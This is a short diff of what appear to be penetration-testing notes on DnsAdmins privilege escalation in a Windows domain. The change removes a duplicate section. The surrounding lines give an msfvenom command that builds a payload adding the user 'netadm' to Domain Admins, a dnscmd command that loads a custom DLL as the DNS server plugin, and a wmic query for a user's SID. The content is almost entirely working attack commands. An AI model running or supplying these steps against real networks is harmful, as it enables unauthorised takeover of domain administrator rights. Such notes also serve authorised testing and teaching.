@@ -8,11 +8,6 @@ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain'
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 ```
 
-# Loading Custom DLL
-```powershell
-dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
-```
-
 # Finding User's SID
 ```powershell
 wmic useraccount where name="netadm" get sid
